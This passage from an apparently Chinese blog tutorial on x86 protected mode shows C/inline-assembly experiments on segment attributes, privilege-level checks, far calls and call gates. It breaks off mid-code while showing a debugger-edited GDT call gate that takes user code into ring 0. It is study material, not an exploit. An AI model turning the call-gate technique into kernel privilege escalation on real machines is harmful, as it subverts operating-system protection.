class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span>* argv[])</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> var = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tmov ax,ss                <span class=\"comment\">//ss可读可写</span></span><br><span class=\"line\">\t\tmov ds,ax                <span class=\"comment\">//ds可读可写</span></span><br><span class=\"line\">\t\tmov dword ptr ds:[var],eax        <span class=\"comment\">//ds此时为ss，不报错，说明两个段寄存器权限相同</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span>* argv[])</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> var = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t__asm&#123;</span><br><span class=\"line\">\t\t\tmov ax,cs            <span class=\"comment\">//cs可读可执行不可写</span></span><br><span class=\"line\">\t\t\tmov ds,ax            <span class=\"comment\">//ds可读可写</span></span><br><span class=\"line\">\t\t\tmov dword ptr ds:[var],eax        <span class=\"comment\">//ds此时为cs，写入时报错，说明Attribute属性存在</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>Base探测</strong></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span>* argv[])</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> var = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tmov ax,fs            <span class=\"comment\">//fs 的 base为TEB  用ds编译不过去</span></span><br><span class=\"line\">\t\tmov gs,ax            <span class=\"comment\">//gs 的 base为0</span></span><br><span class=\"line\">\t\tmov eax,gs:[<span class=\"number\">0</span>]        <span class=\"comment\">//gs此时为fs，写入不出错，说明Base属性存在  fs.base+0</span></span><br><span class=\"line\">\t\tmov dword ptr gs:[var],eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>Limit探测</strong></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span>* argv[])</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> var = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tmov ax,fs            <span class=\"comment\">//fs 的 base为TEB  用ds编译不过去</span></span><br><span class=\"line\">\t\tmov gs,ax            <span class=\"comment\">//gs 的 base为0</span></span><br><span class=\"line\">\t\tmov eax,gs:[<span class=\"number\">0x1000</span>]        <span class=\"comment\">//写入出错，超过了fs的limit，说明Limit属性存在 fs.base+0x1000</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//mov eax,ds:[0x7FFDF000+0x1000]  不报错</span></span><br><span class=\"line\">\t\tmov dword ptr gs:[var],eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-4-段寄存器权限\"><a href=\"#2-4-段寄存器权限\" class=\"headerlink\" title=\"2.4 段寄存器权限\"></a>2.4 段寄存器权限</h2><h3 id=\"数据段：\"><a href=\"#数据段：\" class=\"headerlink\" title=\"数据段：\"></a>数据段：</h3><blockquote>\n<p>mov ds,ax\t&#x2F;&#x2F;当执行 mov ds,ax 时，CPU先解析段选择子0020，然后去GDT表找段描述符，检查段描述符P位是否有效，然后检查S位，确认是数据段或代码段，然后检查TYPE域确认是数据段，然后看DPL是否能够访问.只要上述条件都满足，则mov指令执行成功，只要有一条不满足，mov失败。</p>\n</blockquote>\n<h4 id=\"实验一：CPL-x3D-3-RPL-x3D-3-DPL-x3D-3\"><a href=\"#实验一：CPL-x3D-3-RPL-x3D-3-DPL-x3D-3\" class=\"headerlink\" title=\"实验一：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;3\"></a>实验一：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;3</h4><p>修改GDT+0x48为 00cff300&#96;0000ffff</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> var = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tmov ax,<span class=\"number\">0x4B</span> <span class=\"comment\">//RPL=3 CPL=3 DPL=3</span></span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov dword ptr[var],<span class=\"number\">10</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行正常！</p>\n<h4 id=\"实验二：CPL-x3D-3-RPL-x3D-0-DPL-x3D-3\"><a href=\"#实验二：CPL-x3D-3-RPL-x3D-0-DPL-x3D-3\" class=\"headerlink\" title=\"实验二：CPL&#x3D;3 RPL&#x3D;0 DPL&#x3D;3\"></a>实验二：CPL&#x3D;3 RPL&#x3D;0 DPL&#x3D;3</h4><p>修改GDT+0x48为 00cff300&#96;0000ffff</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> var = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tmov ax,<span class=\"number\">0x48</span> <span class=\"comment\">//RPL=0 CPL=3 DPL=3</span></span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov dword ptr[var],<span class=\"number\">10</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行正常！</p>\n<h4 id=\"实验三：CPL-x3D-3-RPL-x3D-3-DPL-x3D-0\"><a href=\"#实验三：CPL-x3D-3-RPL-x3D-3-DPL-x3D-0\" class=\"headerlink\" title=\"实验三：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;0\"></a>实验三：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;0</h4><p>修改GDT+0x48为 00cf9300&#96;0000ffff</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> var = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tmov ax,<span class=\"number\">0x4B</span> <span class=\"comment\">//RPL=3 CPL=3 DPL=0</span></span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov dword ptr[var],<span class=\"number\">10</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行失败！</p>\n<h4 id=\"实验四：CPL-x3D-3-RPL-x3D-0-DPL-x3D-0\"><a href=\"#实验四：CPL-x3D-3-RPL-x3D-0-DPL-x3D-0\" class=\"headerlink\" title=\"实验四：CPL&#x3D;3 RPL&#x3D;0 DPL&#x3D;0\"></a>实验四：CPL&#x3D;3 RPL&#x3D;0 DPL&#x3D;0</h4><p>修改GDT+0x48为 00cf9300&#96;0000ffff</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> var = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tmov ax,<span class=\"number\">0x48</span> <span class=\"comment\">//RPL=3 CPL=3 DPL=0</span></span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov dword ptr[var],<span class=\"number\">10</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行失败！</p>\n<h4 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h4><p>数据段下<code>RPL&lt;=DPL &amp;&amp; CPL&lt;=DPL(数值上)</code>，实验四失败是因为此时运行的环境为3环。</p>\n<h3 id=\"代码段（跨段跳转-不提权）：\"><a href=\"#代码段（跨段跳转-不提权）：\" class=\"headerlink\" title=\"代码段（跨段跳转-不提权）：\"></a>代码段（跨段跳转-不提权）：</h3><p>跳转指令有call、jmp两种，格式如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CALL FAR CS:EIP</span><br><span class=\"line\">JMP  FAR CS:EIP</span><br><span class=\"line\"></span><br><span class=\"line\">;CALL/JMP FAR 0x20:0x004183D7</span><br><span class=\"line\">;0x20为新的cs寄存器，通过拆分新的cs寄存器得到段描述符后根据其base+0x004183D7进行跳转。</span><br></pre></td></tr></table></figure>\n\n<p>为了避免干扰，需要关闭<code>增量链接</code>和<code>随机地址</code>。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028142955249.png\" alt=\"image-20221028142955249\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028142922784.png\" alt=\"image-20221028142922784\"></p>\n<h4 id=\"长跳转与短跳转\"><a href=\"#长跳转与短跳转\" class=\"headerlink\" title=\"长跳转与短跳转\"></a>长跳转与短跳转</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">汇编写法：</span><br><span class=\"line\">call/jmp far cs:eip</span><br><span class=\"line\"></span><br><span class=\"line\">C++写法：</span><br><span class=\"line\">char buf[6]=&#123;78,56,34,12,0x4b,0&#125;; </span><br><span class=\"line\">call/jmp fword ptr [buf] // call 4b:12345678</span><br></pre></td></tr></table></figure>\n\n<p>长跳转的压栈与短跳转(普通的call)压栈略有区别。短跳转会将下一行代码的地址入栈后进行跳转；而长跳转会将当前cs和下一行代码的地址入栈再跳转。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028171858280.png\" alt=\"image-20221028171858280\"></p>\n<p>执行前</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028172347806.png\" alt=\"image-20221028172347806\"></p>\n<p>执行后</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028172310947.png\" alt=\"image-20221028172310947\"></p>\n<p>因此ret指令已经不适合长跳转的返回，取而代之的是<code>retf</code>。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028172807035.png\" alt=\"image-20221028172807035\"></p>\n<h4 id=\"实验一：CPL-x3D-3-RPL-x3D-3-DPL-x3D-3-1\"><a href=\"#实验一：CPL-x3D-3-RPL-x3D-3-DPL-x3D-3-1\" class=\"headerlink\" title=\"实验一：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;3\"></a>实验一：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;3</h4><p>构造描述符00cffb00&#96;0000ffff(type:1011，非一致代码段)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">6</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4b</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">//前四个字节为跳转的地址,后两个字节为新的CS</span></span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)&amp;buf[<span class=\"number\">0</span>]=(<span class=\"type\">int</span>)test;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tcall fword ptr [buf]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行正常！</p>\n<h4 id=\"实验二：CPL-x3D-3-RPL-x3D-0-DPL-x3D-3-1\"><a href=\"#实验二：CPL-x3D-3-RPL-x3D-0-DPL-x3D-3-1\" class=\"headerlink\" title=\"实验二：CPL&#x3D;3 RPL&#x3D;0 DPL&#x3D;3\"></a>实验二：CPL&#x3D;3 RPL&#x3D;0 DPL&#x3D;3</h4><p>构造描述符00cffb00&#96;0000ffff(type:1011，非一致代码段)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">6</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x48</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">//前四个字节为跳转的地址,后两个字节为新的CS</span></span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)&amp;buf[<span class=\"number\">0</span>]=(<span class=\"type\">int</span>)test;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tcall fword ptr [buf]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行正常,但会发现cs并没有被修改为0x48。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028184231219.png\" alt=\"image-20221028184231219\"></p>\n<p><strong>原因：长跳转时有那么一个计算 RPL|DPL -&gt; 0|3 &#x3D; 3 &#x3D;&gt; 4B</strong></p>\n<h4 id=\"实验三：CPL-x3D-3-RPL-x3D-3-DPL-x3D-0-1\"><a href=\"#实验三：CPL-x3D-3-RPL-x3D-3-DPL-x3D-0-1\" class=\"headerlink\" title=\"实验三：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;0\"></a>实验三：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;0</h4><p>构造描述符00cf9b00&#96;0000ffff(type:1011，非一致代码段)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">6</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4b</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">//前四个字节为跳转的地址,后两个字节为新的CS</span></span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)&amp;buf[<span class=\"number\">0</span>]=(<span class=\"type\">int</span>)test;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tcall fword ptr [buf]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行失败！</p>\n<h4 id=\"实验四：CPL-x3D-3-RPL-x3D-0-DPL-x3D-0-1\"><a href=\"#实验四：CPL-x3D-3-RPL-x3D-0-DPL-x3D-0-1\" class=\"headerlink\" title=\"实验四：CPL&#x3D;3 RPL&#x3D;0 DPL&#x3D;0\"></a>实验四：CPL&#x3D;3 RPL&#x3D;0 DPL&#x3D;0</h4><p>构造描述符00cf9b00&#96;0000ffff(type:1011，非一致代码段)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">6</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x48</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">//前四个字节为跳转的地址,后两个字节为新的CS</span></span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)&amp;buf[<span class=\"number\">0</span>]=(<span class=\"type\">int</span>)test;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tcall fword ptr [buf]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行失败！</p>\n<h4 id=\"实验五：CPL-x3D-3-RPL-x3D-3-DPL-x3D-3-（retf）\"><a href=\"#实验五：CPL-x3D-3-RPL-x3D-3-DPL-x3D-3-（retf）\" class=\"headerlink\" title=\"实验五：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;3 （retf）\"></a>实验五：CPL&#x3D;3 RPL&#x3D;3 DPL&#x3D;3 （retf）</h4><p>构造描述符00cffb00&#96;0000ffff(type:1011，非一致代码段)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">6</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4b</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">//前四个字节为跳转的地址,后两个字节为新的CS</span></span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)&amp;buf[<span class=\"number\">0</span>]=(<span class=\"type\">int</span>)test;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tcall fword ptr [buf]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在retf处下断点，然后修改保存的cs为18（0环）。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028191429965.png\" alt=\"image-20221028191429965\"></p>\n<p>然后运行，发现异常。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028191518915.png\" alt=\"image-20221028191518915\"></p>\n<h4 id=\"总结：-1\"><a href=\"#总结：-1\" class=\"headerlink\" title=\"总结：\"></a>总结：</h4><p>跨段代码无法进行提权（提权需要门）。</p>\n<p>然后火哥是这么说的!!!!!</p>\n<ul>\n<li>JMP和CALL 只能用于同权限，或者往高权限跳。(实验一到实验五我是没看出来这个，但是火哥说了就先记住！嘤嘤嘤~~~~)</li>\n<li>retf 和 iretd 只能用于同权限，或者往低权限返回。(根据实验五可以推测出来)</li>\n</ul>\n<h1 id=\"3、调用门\"><a href=\"#3、调用门\" class=\"headerlink\" title=\"3、调用门\"></a>3、调用门</h1><p>门，通往新世界的通道。与长跳转类似也是通过<code>call far cs:eip(jmp不行)</code>进行调用。当cs对应的段描述符的S&#x3D;0时，CPU会识别这个描述符是一个门，每个门格式不同。调用门格式如下：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028194713225.png\" alt=\"image-20221028194713225\"></p>\n<ul>\n<li><p>P：表示该描述符是否有效。</p>\n</li>\n<li><p>DPL：当前描述符的权限。</p>\n</li>\n<li><p>Type:1100，表明是一个调用门。</p>\n</li>\n<li><p>ParamCount：调用参数个数。</p>\n</li>\n<li><p>Segment Selector:门的选择子。</p>\n</li>\n<li><p>Offset in Segment:门的偏移，跳转地址：门的选择子.base + 偏移。</p>\n</li>\n</ul>\n<h2 id=\"实验一：提权R3进入R0环\"><a href=\"#实验一：提权R3进入R0环\" class=\"headerlink\" title=\"实验一：提权R3进入R0环\"></a>实验一：提权R3进入R0环</h2><p>构造一个3环-&gt;0环的描述符<code>1234EC00·00085678</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">offset in segment:0x12345678</span><br><span class=\"line\">segment selector:0x0008 -&gt; 1 0 00 (0环权限，查GDT，index=1)</span><br><span class=\"line\">p:1</span><br><span class=\"line\">dpl:3</span><br><span class=\"line\">param count:0</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">3</span></span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">6</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4b</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,test);</span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)&amp;buf[<span class=\"number\">0</span>]=(<span class=\"type\">int</span>)test;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tcall fword ptr buf;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在printf下断点，查看函数test地址后填充到门描述符。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028200858575.png\" alt=\"image-20221028200858575\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028200959253.png\" alt=\"image-20221028200959253\"></p>\n<p>然后单步执行调用门后int 3断点被执行。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028201116857.png\" alt=\"image-20221028201116857\"></p>\n<p>使用<code>u[f] addr [-lxxxx]</code>查看汇编,其中f可以直接查看函数的所有汇编。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028201232089.png\" alt=\"image-20221028201232089\"></p>\n<p>说明此时已经跨段提权进入0环。输入g命令继续执行，此时发现r3层异常中断，原因为int 3造成,去掉int 3即可正常运行。</p>\n<p>与长跳转不同的是，由于调用门为R3进入到R0，由于两个权限的地址范围和权限不同，因此调用门在call的时候会将ss、esp、cs、下一行代码地址，进行入栈。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028202041627.png\" alt=\"image-20221028202041627\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028202349714.png\" alt=\"image-20221028202349714\"></p>\n<h2 id=\"实验二：调用0环函数-DbgPrint\"><a href=\"#实验二：调用0环函数-DbgPrint\" class=\"headerlink\" title=\"实验二：调用0环函数(DbgPrint)\"></a>实验二：调用0环函数(DbgPrint)</h2><p>首先使用<code>uf nt!DbgPrint</code>获取函数地址</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028202522357.png\" alt=\"image-20221028202522357\"></p>\n<p>然后添加函数声明。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"title function_\">int</span> <span class=\"params\">(__cdecl *fnDbgPrint)</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> * _Format, ...)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">fnDbgPrint myDbgPrint = (fnDbgPrint)<span class=\"number\">0x83e4fc60</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span> msg[]=<span class=\"string\">&quot;fuking man!!!&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span 